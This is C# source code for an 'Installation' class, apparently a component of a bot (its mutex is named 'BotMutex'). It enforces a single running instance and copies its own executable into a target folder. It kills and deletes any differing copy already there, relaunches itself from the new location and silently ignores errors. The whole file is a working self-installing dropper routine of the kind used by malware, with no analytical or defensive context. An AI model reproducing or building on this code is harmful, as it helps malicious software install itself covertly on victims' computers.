using System;
using System.Diagnostics;
using System.IO;
using System.Security.Cryptography;
using System.Threading;

internal class Installation
{
    private string TargetExeName;
    private string TargetFolder;

    public Installation(string TargetFolder, string TargetExeName)
    {
        this.TargetExeName = TargetExeName;
        this.TargetFolder = TargetFolder;
    }

    public bool CheckAndCreateMutex(string BotMutex)
    {
        Mutex mutex;
        try
        {
            mutex = Mutex.OpenExisting(BotMutex);
            return false;
        }
        catch
        {
            mutex = new Mutex(true, BotMutex);
            return true;
        }
    }

    public void Drop()
    {
        if (Environment.CurrentDirectory != this.TargetFolder)
        {
            ProcessStartInfo info;
            string str = this.MD5Hash(Process.GetCurrentProcess().MainModule.FileName);
            if (File.Exists(this.TargetFolder + @"\" + this.TargetExeName))
            {
                if (this.MD5Hash(this.TargetFolder + @"\" + this.TargetExeName) != str)
                {
                    try
                    {
                        Process[] processes = Process.GetProcesses();
                        try
                        {
                            foreach (Process process in processes)
                            {
                                if (process.MainModule.FileName == (this.TargetFolder + @"\" + this.TargetExeName))
                                {
                                    process.Kill();
                                }
                            }
                        }
                        catch
                        {
                        }
                        File.SetAttributes(this.TargetFolder + @"\" + this.TargetExeName, FileAttributes.Normal);
                        File.Delete(this.TargetFolder + @"\" + this.TargetExeName);
                        File.Copy(Process.GetCurrentProcess().MainModule.FileName, this.TargetFolder + @"\" + this.TargetExeName);
                        info = new ProcessStartInfo(this.TargetFolder + @"\" + this.TargetExeName);
                        info.WorkingDirectory = this.TargetFolder;
                        Process.Start(info);
                        Environment.Exit(0);
                    }
                    catch
                    {
                    }
                }
                else
                {
                    info = new ProcessStartInfo(this.TargetFolder + @"\" + this.TargetExeName);
                    info.WorkingDirectory = this.TargetFolder;
                    Process.Start(info);
                    Environment.Exit(0);
                }
            }
            else
            {
                try
                {
                    if (!Directory.Exists(this.TargetFolder))
                    {
                        Directory.CreateDirectory(this.TargetFolder);
                    }
                    File.Copy(Process.GetCurrentProcess().MainModule.FileName, this.TargetFolder + @"\" + this.TargetExeName);
                    info = new ProcessStartInfo(this.TargetFolder + @"\" + this.TargetExeName);
                    info.WorkingDirectory = this.TargetFolder;
                    Process.Start(info);
                    Environment.Exit(0);
                }
                catch
                {
                }
            }
        }
    }

    private string MD5Hash(string sFilePath)
    {
        string str;
        try
        {
            MD5CryptoServiceProvider provider = new MD5CryptoServiceProvider();
            FileStream inputStream = new FileStream(sFilePath, FileMode.Open, FileAccess.Read);
            byte[] buffer = provider.ComputeHash(inputStream);
            inputStream.Close();
            str = BitConverter.ToString(buffer);
        }
        catch (Exception exception)
        {
            throw exception;
        }
        return str;
    }
}

